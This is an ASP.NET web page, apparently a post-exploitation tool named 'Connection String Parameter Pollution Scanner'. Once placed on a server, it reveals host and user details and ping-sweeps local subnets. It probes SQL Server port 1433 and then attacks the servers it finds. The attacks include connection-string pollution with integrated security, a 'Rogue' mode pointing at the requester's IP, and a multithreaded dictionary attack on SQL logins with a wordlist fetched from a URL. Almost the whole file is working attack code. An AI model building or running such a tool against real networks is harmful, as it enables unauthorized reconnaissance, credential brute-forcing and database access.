<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    private static System.Data.DataTable equipos;
    private static System.Data.DataTable tablaDiccionario;

    private const int SQLPort = 1433;
    private const int MAXTHREADS = 10;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!Page.IsPostBack)
        {
            LoadInterfaces();

            txtSO.Text = loadSO();
        }
    }

    private void LoadInterfaces()
    {
        System.Net.NetworkInformation.IPGlobalProperties ipProperties =
           System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties();

        txtHome.Text = ipProperties.HostName + " (User: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + ")";
        txtDomain.Text = ipProperties.DomainName;

        foreach (System.Net.NetworkInformation.NetworkInterface networkCard in
                 System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
        {
            if (networkCard.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
            {
                TreeNode interfaz = new TreeNode();

                interfaz.Value = networkCard.Id;
                interfaz.Text = networkCard.Name;
                interfaz.ChildNodes.Add(new TreeNode(networkCard.Description));
                interfaz.ChildNodes.Add(new TreeNode("Status: " + networkCard.OperationalStatus));
                interfaz.ChildNodes.Add(new TreeNode("MAC Address: " + networkCard.GetPhysicalAddress().ToString()));

                TreeNode ipAddress = new TreeNode("IP Address");
                foreach (System.Net.NetworkInformation.UnicastIPAddressInformation ipAddr in
                        networkCard.GetIPProperties().UnicastAddresses)
                {
                    ipAddress.ChildNodes.Add(new TreeNode(ipAddr.Address.ToString()));

                }
                interfaz.ChildNodes.Add(ipAddress);

                TreeNode gateWay = new TreeNode("Gateway Address: ");
                foreach (System.Net.NetworkInformation.GatewayIPAddressInformation gatewayAddr in
                        networkCard.GetIPProperties().GatewayAddresses)
                {
                    gateWay.ChildNodes.Add(new TreeNode(gatewayAddr.Address.ToString()));

                }
                interfaz.ChildNodes.Add(gateWay);

                TreeNode dns = new TreeNode("DNS Settings: ");
                foreach (System.Net.IPAddress address in
                        networkCard.GetIPProperties().DnsAddresses)
                {
                    dns.ChildNodes.Add(new TreeNode(address.ToString()));
                }
                interfaz.ChildNodes.Add(dns);

                TreeNode ip = new TreeNode("Current IP Connections: ");
                foreach (System.Net.NetworkInformation.TcpConnectionInformation tcpConnection in
                        System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().
                        GetActiveTcpConnections())
                {
                    ip.ChildNodes.Add(new TreeNode(
                        "Remote Address: " + tcpConnection.RemoteEndPoint.Address.ToString()
                        + "State: " + tcpConnection.State.ToString()));
                }
                interfaz.ChildNodes.Add(ip);

                treeViewInterfaces.Nodes.Add(interfaz);
            }
        }

        treeViewInterfaces.DataBind();
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern public int GetVersion();

    private string loadSO()
    {
        string version;
        int res;
        res = GetVersion();

        int major, minor, build;

        major = LoByte(LoWord(res));
        minor = HiByte(LoWord(res));

        // A partir de NT 4 tiene el Build (no en Me/9x)
        build = HiWord(res);

        bool valid = false;
        version = String.Empty;

        switch (major)
        {
            case 3:
                version = "Microsoft Windows NT 3.51. ";
                break;
            case 4:
                switch (minor)
                {
                    case 0: version = "Microsoft Windows 95/NT 4.0. ";
                        break;
                    case 10: version = "Microsoft Windows 98. ";
                        break;
                    case 90: version = "Microsoft Windows ME. ";
                        break;
                }
                break;
            case 5:
                switch (minor)
                {
                    case 0: version = "Microsoft Windows 2000. ";
                        break;
                    case 1: version = "Microsoft Windows XP. ";
                        break;
                    case 2: version = "Microsoft Windows 2003. ";
                        break;
                }
                break;
            case 6:
                switch (minor)
                {
                    case 0: version = "Microsoft Windows Vista/Server 2008. ";
                        break;
                    case 1: version = "Microsoft Windows 7/Server 2008 R2. ";
                        break;
                }
                break;
            default:
                version = "unknown";
                break;
        }

        version += String.Format("Version: {0}.{1}.{2}", major, minor, build);
        return version;
    }

    private string szTrim(string s)
    {
        int i;
        i = s.IndexOf((char)0);
        if (i > -1)
        {
            s = s.Substring(0, i);
        }
        return s.Trim();
    }

    private int LoWord(int numero)
    {
        // Devuelve el LoWord del número pasado como parámetro
        return numero & 0xFFFF;
    }

    private int HiWord(int numero)
    {
        // Devuelve el HiWord del número pasado como parámetro
        return numero / 0x10000 & 0xFFFF;
    }

    // Para valores (0~65535)
    private int LoByte(int numero)
    {
        return numero & 0xFF;
    }

    private int HiByte(int numero)
    {
        return numero / 0x100 & 0xFF;
    }

    private void scanner(bool checkSql)
    {
        equipos = new System.Data.DataTable();
        equipos.Columns.Add("SQL");
        System.Data.DataColumn key = equipos.Columns.Add("IP");
        equipos.Columns.Add("Name");
        equipos.PrimaryKey = new System.Data.DataColumn[] { key };

        foreach (TreeNode interfaz in treeViewInterfaces.Nodes)
        {
            if (interfaz.Checked)
            {
                foreach (System.Net.NetworkInformation.NetworkInterface networkCard in
                  System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (networkCard.Id.Equals(interfaz.Value))
                    {
                        foreach (System.Net.NetworkInformation.UnicastIPAddressInformation ipAddr in
                            networkCard.GetIPProperties().UnicastAddresses)
                        {
                            if (ipAddr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                barridoPing(ipAddr.Address.ToString(), checkSql);
                        }
                    }
                }
            }
        }

        if (equipos.Rows.Count > 0)
        {
            panelResutlados.Visible = true;
            gridEquipos.DataSource = equipos;
            gridEquipos.DataBind();
        }
        else
        {
            panelResutlados.Visible = false;
        }

    }

    protected void btScanner_Click(object sender, EventArgs e)
    {
        scanner(false);
    }

    private static System.Threading.Semaphore _pool;

    private void barridoPing(string ip, bool checkSql)
    {
        int NumThreads = 10;

        try
        {
            NumThreads = Int32.Parse(lbMaxThreads.Text);
        }
        catch { }

        DateTime ini = DateTime.Now;

        string[] local = ip.Split('.');

        System.Threading.Thread[] threads = new System.Threading.Thread[255];

        _pool = new System.Threading.Semaphore(NumThreads, NumThreads);

        for (int i = 0; i < 255; i++)
        {
            _pool.WaitOne();

            System.Threading.ThreadStart starter = delegate { sendPing(String.Format("{0}.{1}.{2}.{3}", local[0], local[1], local[2], i), checkSql); };
            threads[i] = new System.Threading.Thread(starter);
            threads[i].Start();
        }

        for (int i = 0; i < 255; i++)
        {
            threads[i].Join();
        }

        DateTime fin = DateTime.Now;

        lbThreads.Text = "Maximun number of threads: " + NumThreads;
        lbTiempo.Text = " Execution time: " + fin.Subtract(ini).TotalSeconds + " seconds";
    }

    public static void sendPing(string ip, bool checkSql)
    {
        System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping();
        System.Net.NetworkInformation.PingReply reply = pingSender.Send(ip, 5000);

        if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
        {
            if (!equipos.Rows.Contains(ip))
            {
                try
                {
                    System.Data.DataRow row = equipos.NewRow();
                    row["IP"] = ip;
                    try
                    {
                        row["Name"] = System.Net.Dns.GetHostEntry(ip).HostName;
                    }
                    catch { }

                    if (checkSql && connectSQL(ip))
                    {
                        row["SQL"] = "ico_bbdd.jpg";
                    }
                    else
                    {
                        row["SQL"] = "ico_sv.jpg";
                    }


                    equipos.Rows.Add(row);
                }
                catch { }

            }
        }

        _pool.Release();
    }

    private static Boolean connectSQL(string ip)
    {
        System.Net.Sockets.Socket server = null;

        try
        {
            System.Net.IPEndPoint endPoint = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(ip), SQLPort);
            server = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);

            server.Connect(endPoint);

            return true;
        }
        catch { return false; }
        finally { server.Close(); }
    }

    private void changeStatus(Control control, bool enabled)
    {
        foreach (Control c in control.Controls)
            changeStatus(c, enabled);

        if (control is WebControl)
            ((WebControl)control).Enabled = enabled;
    }

    private void changeVisibility(Control control, bool visible)
    {
        foreach (Control c in control.Controls)
            changeVisibility(c, visible);

        control.Visible = visible;
    }

    protected void btScannerSql_Click(object sender, EventArgs e)
    {
        scanner(true);
    }

    protected void btCerrar_Click(object sender, EventArgs e)
    {
        changeVisibility(panelDatos, false);
        changeStatus(panelScaner, true);
    }

    private static Boolean find;

    private static void diccionaryAttack(string user, string connectionstring)
    {
        System.Data.DataRow row = tablaDiccionario.NewRow();
        row["Try"] = user;

        System.Data.SqlClient.SqlConnection conn = null;
        System.Data.SqlClient.SqlCommand cmd = null;

        try
        {
            conn = new System.Data.SqlClient.SqlConnection();
            conn.ConnectionString = connectionstring.Replace("[ATTACK]", user);
            conn.Open();

            cmd = new System.Data.SqlClient.SqlCommand("select @@version", conn);
            string version = cmd.ExecuteScalar().ToString();

            row["Result"] = version;
            find = true;
        }
        catch (Exception exc)
        {
            row["Result"] = exc.Message;
        }
        finally
        {
            if (conn != null)
                conn.Dispose();
            if (cmd != null)
                cmd.Dispose();

            tablaDiccionario.Rows.Add(row);
        }
    }

    protected void btLaunch_Click(object sender, EventArgs e)
    {
        lbError.Text = String.Empty;
        System.Data.SqlClient.SqlConnection conn = null;
        lbError.Text = String.Empty;

        switch (rbTypes.SelectedValue)
        {
            case "0":
            case "1":
            case "2":
                try
                {
                    conn = new System.Data.SqlClient.SqlConnection();

                    conn.ConnectionString = txtConnectionString.Text;
                    conn.Open();

                    System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(txtQuery.Text, conn);
                    System.Data.DataTable tabla = new System.Data.DataTable();
                    da.Fill(tabla);

                    gridresults.DataSource = tabla;
                    gridresults.DataBind();
                    break;
                }
                catch (Exception exc)
                {
                    lbError.Text = exc.Message;
                }
                finally
                {
                    if (conn != null)
                        conn.Close();
                }
                break;

            case "3":
                System.Net.WebResponse response = null;
                System.IO.StreamReader reader = null;

                try
                {
                    find = false;

                    System.Net.HttpWebRequest request = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(txtLista.Text);
                    request.Method = "GET";
                    response = request.GetResponse();
                    reader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.UTF8);
                    string result = reader.ReadToEnd();

                    conn = new System.Data.SqlClient.SqlConnection();
                    tablaDiccionario = new System.Data.DataTable();
                    tablaDiccionario.Columns.Add("Try");
                    tablaDiccionario.Columns.Add("Result");

                    string[] users = result.Split('\n');

                    int NumThreads = 10;

                    try
                    {
                        NumThreads = Int32.Parse(lbMaxThreads.Text);
                    }
                    catch { }

                    DateTime ini = DateTime.Now;

                    System.Threading.Thread[] threads = new System.Threading.Thread[users.Length];

                    _pool = new System.Threading.Semaphore(NumThreads, NumThreads);

                    for (int i = 0; i < users.Length; i++)
                    {
                        _pool.WaitOne();

                        if (find) break;

                        string usuario = users[i];

                        System.Threading.ThreadStart starter = delegate { diccionaryAttack(usuario, txtConnectionString.Text); };
                        threads[i] = new System.Threading.Thread(starter);
                        threads[i].Start();
                    }

                    for (int i = 0; i < users.Length; i++)
                    {
                        try
                        {
                            threads[i].Join();
                        }
                        catch { }
                    }

                    DateTime fin = DateTime.Now;

                    gridresults.DataSource = tablaDiccionario;
                    gridresults.DataBind();

                    lbError.Text = " Execution time: " + fin.Subtract(ini).TotalSeconds + " seconds";

                }
                catch (Exception ex)
                {
                    lbError.Text = ex.Message;
                }
                finally
                {
                    if (reader != null)
                        reader.Close();
                    if (response != null)
                        response.Close();
                }
                break;

        }
    }

    protected void gridEquipos_SelectedIndexChanged(object sender, EventArgs e)
    {
        String cadena = @"Data Source=" + gridEquipos.SelectedRow.Cells[2].Text + ";integrated security=true";
        txtConnectionString.Text = cadena;
        txtQuery.Text = "select @@version";
        rbTypes.SelectedValue = "0";
        lbError.Text = "";
        gridresults.DataSource = null;
        gridresults.DataBind();

        changeVisibility(panelDatos, true);
        changeStatus(panelScaner, false);

        panelDiccionario.Visible = false;
    }

    protected void rbTypes_SelectedIndexChanged(object sender, EventArgs e)
    {
        switch (rbTypes.SelectedValue)
        {
            case "0": txtConnectionString.Text = @"Data Source=" + gridEquipos.SelectedRow.Cells[2].Text.Replace("127.0.0.1", "localhost") + ";integrated security=true";
                panelDiccionario.Visible = false;
                break;

            case "1": txtConnectionString.Text = @"Data Source=" + gridEquipos.SelectedRow.Cells[2].Text.Replace("127.0.0.1", "localhost") + @"\SqlExpress;integrated security=true";
                panelDiccionario.Visible = false;
                break;

            case "2": txtConnectionString.Text = @"Data Source=" + Request.UserHostAddress.Replace("127.0.0.1", "localhost") + ";integrated security=true";
                panelDiccionario.Visible = false;
                break;

            case "3": panelDiccionario.Visible = true;
                break;

        }

    }

    protected void rbFixed_SelectedIndexChanged(object sender, EventArgs e)
    {
        switch (rbFixed.SelectedValue)
        {
            case "0":
                txtConnectionString.Text = @"Data Source=" + gridEquipos.SelectedRow.Cells[2].Text.Replace("127.0.0.1", "localhost") + ";User id=" + txtFixed.Text + ";Password=[ATTACK]";
                break;
            case "1":
                txtConnectionString.Text = @"Data Source=" + gridEquipos.SelectedRow.Cells[2].Text.Replace("127.0.0.1", "localhost") + ";User id=[ATTACK];Password=" + txtFixed.Text;
                break;
        }
    }

    protected void txtFixed_TextChanged(object sender, EventArgs e)
    {
        rbFixed_SelectedIndexChanged(null, null);
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <title>CSPPs: Connecion String Parameter Polution Scanner</title>
</head>
<body>
    <form id="form1" runat="server">
    <div runat="server" id="panelScaner" style="width: 800px">
    <div style="border: 2px groove #000099; padding: 3px; margin: 3px; font-family: Arial, Helvetica, sans-serif; font-size: small; font-weight: normal;">
        <table width="100%">
        <thead style="background-color: #0000FF; color: #FFFFFF">
            <tr><td colspan="2" align="center">Server Information</td></tr>
        </thead>
        <tbody>           
            <tr><td>Host Name: </td><td><asp:Label ID="txtHome" runat="server"></asp:Label></td></tr>
            <tr><td>Domain Name: </td><td><asp:Label ID="txtDomain" runat="server"></asp:Label></td></tr>
            <tr><td>Operating System: </td><td><asp:Label ID="txtSO" runat="server"></asp:Label>            </td></tr>
        </tbody>
        </table>               
    </div>    
    <table border="0" width="800px">
        <tr>
        <td style="width:50%;vertical-align:top;">
            <div style="border: 2px groove #000099; font-family: Arial, Helvetica, sans-serif; font-size: small; font-weight: normal;width: 390px; height: 480px">
                <table>
                    <thead style="background-color: #0000FF; color: #FFFFFF" >
                        <tr><td colspan="2" align="center">Network Interfaces</td></tr>
                    </thead>
                    <tbody>
                        <tr><td colspan="2">
                            <div style="overflow:auto; width:380px; height: 380px">
                            <asp:TreeView ID="treeViewInterfaces" runat="server" ShowCheckBoxes="Root" 
                            ExpandDepth="0" ImageSet="Simple" NodeIndent="10">
                            <ParentNodeStyle Font-Bold="False" />
                            <HoverNodeStyle Font-Underline="True" ForeColor="#DD5555" />
                            <SelectedNodeStyle Font-Underline="True" ForeColor="#DD5555" 
                                HorizontalPadding="0px" VerticalPadding="0px" />
                            <NodeStyle Font-Names="Verdana" Font-Size="8pt" ForeColor="Black" 
                                HorizontalPadding="0px" NodeSpacing="0px" VerticalPadding="0px" />
                            
                            </asp:TreeView>
                            </div>
                        </td></tr>
                    </tbody>
                    <tfoot>
                    <tr><td colspan="2">&nbsp;</td></tr>
                        <tr><td colspan="2" style="text-align:center">Number maximun of threads: <asp:TextBox ID="lbMaxThreads" Text="10" runat="server"></asp:TextBox></td></tr>
                        <tr>                                                                                    
                            <td colspan="2" style="text-align:center"><asp:Button ID="btScanner" BorderStyle="Groove" runat="server" Text="Scan Servers" onclick="btScanner_Click" />&nbsp;
                            <asp:Button ID="btScannerSql" BorderStyle="Groove" runat="server" 
                                    Text="Scan SQL Servers" onclick="btScannerSql_Click" 
                                     /></td>                           
                        </tr>                        
                    </tfoot>
               </table>
           </div>
        </td>
        <td style="width:50%;vertical-align:top;font-size:medium">
            <div style="border: 2px groove #000099; font-family: Arial, Helvetica, sans-serif; font-size: small; font-weight: normal; width: 390px; height: 480px">
                <table>
                    <thead style="background-color: #0000FF; color: #FFFFFF">
                        <tr><td align="center">Servers found</td></tr>
                    </thead>
                    <tbody>
                        <tr><td>
                            <div style="overflow:auto; width:380px; height: 390px">
                                <asp:Panel runat="server" ID="panelResutlados" Visible="false" >
                                <asp:GridView ID="gridEquipos" runat="server" AutoGenerateColumns="False" 
                                        ShowHeader="False" AutoGenerateSelectButton="True" 
                                        onselectedindexchanged="gridEquipos_SelectedIndexChanged">
                                    <Columns>                            
                                              
                                        <asp:ImageField DataImageUrlField="SQL">
                                        </asp:ImageField>                                      
                                        <asp:BoundField DataField="IP"  />
                                        <asp:BoundField DataField="Name"  />
                                    </Columns>
                                    <SelectedRowStyle Font-Bold="true" />
                                </asp:GridView>
                                </asp:Panel> 
                            </div>
                            <br /><br />
                            <div>
                                <asp:Label ID="lbThreads" runat="server"></asp:Label><br />
                                <asp:Label ID="lbTiempo" runat="server"></asp:Label>
                            </div>
                        </td></tr>
                    </tbody>
                </table>
            </div>
        </td>
        </tr>    
    </table>                
    
    </div>
    
        
    <div runat="server" id="panelDatos" Visible="false" style="position:absolute;width:640px;height:480px;border: 2px groove #000099; padding: 3px; margin: 3px; font-family: Arial, Helvetica, sans-serif; font-size: small; font-weight: normal;top:50px;left:50px; background-color: #C0C0C0;">
        <table>
            <thead style="background-color: #0000FF; color: #FFFFFF">
                <tr><td colspan="2" align="center">Execute Query</td></tr>
            </thead>
            <tbody>
                <tr><td colspan="2">&nbsp;</td></tr>
                <tr>
                    <td>Connection string: </td>
                    <td><asp:TextBox ID="txtConnectionString" runat="server" Width="500px" Visible="false" ></asp:TextBox></td>
                </tr>
                <tr>
                    <td>Selected Query: </td>
                    <td><asp:TextBox ID="txtQuery" runat="server" Width="500px" Visible="false" ></asp:TextBox></td>
                </tr>
                <tr>
                    <td rowspan="2" style="vertical-align:top">Select attack type</td>
                    <td>                        
                        <asp:RadioButtonList ID="rbTypes" runat="server" RepeatDirection="Horizontal" 
                            AutoPostBack="true" onselectedindexchanged="rbTypes_SelectedIndexChanged">
                            <asp:ListItem Text="CSPP (Default)" Value="0" Selected="True"></asp:ListItem>
                            <asp:ListItem Text="CSPP (Express)" Value="1"></asp:ListItem>
                            <asp:ListItem Text="Rogue" Value="2"></asp:ListItem>                            
                            <asp:ListItem Value="3">Dictionary</asp:ListItem>
                        </asp:RadioButtonList>                        
                    </td>
                </tr>
                <tr>
                    <td>
                    <asp:Panel BorderColor="#000099" BorderWidth="2px" BorderStyle="Groove" ID="panelDiccionario" runat="server" Visible="false">
                    <table>
                            <tr>
                                <td align="center"><asp:RadioButtonList ID="rbFixed" runat="server"                             
                                        RepeatDirection="Horizontal" AutoPostBack="True" 
                                        onselectedindexchanged="rbFixed_SelectedIndexChanged">
                                        <asp:ListItem Value="0" Selected="True">User</asp:ListItem>
                                        <asp:ListItem Value="1">Password</asp:ListItem>
                                    </asp:RadioButtonList>
                                </td>
                                  <td align="center"><asp:Label ID="lbLista" runat="server" Text="List Url"></asp:Label></td>                        
                            </tr>    
                            <tr>
                            
                                 <td>
                                    <asp:TextBox ID="txtFixed" runat="server" AutoPostBack="True" 
                                         ontextchanged="txtFixed_TextChanged"></asp:TextBox>
                                </td>
                                <td>
                                    <asp:TextBox ID="txtLista" runat="server" Width="320px"></asp:TextBox>                                     
                                </td>
                            </tr>
                       </table>                                                
                       </asp:Panel>
                    </td>                
                </tr>
                <tr>
                    <td colspan="2"><asp:Label ID="lbError" runat="server" ForeColor="Red"></asp:Label></td>
                </tr>
                <tr><td colspan="2">&nbsp;</td></tr>
                <tr>
                    <td colspan="2" style="text-align:center">
                        <asp:Button ID="btLaunch" runat="server" BorderStyle="Groove" Text="Execute" onclick="btLaunch_Click" />&nbsp;                        
                        <asp:Button ID="btCerrar" runat="server" Text="Close" onclick="btCerrar_Click" BorderStyle="Groove" />
                    </td>
                </tr>
                <tr><td colspan="2">&nbsp;</td></tr>
                <tr>
                    <td colspan="2">                   
                        <div style="overflow:auto;width:600px;height:200px" >
                            <asp:GridView ID="gridresults" runat="server"></asp:GridView>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>        
    </div>
    </form>
</body>
</html>
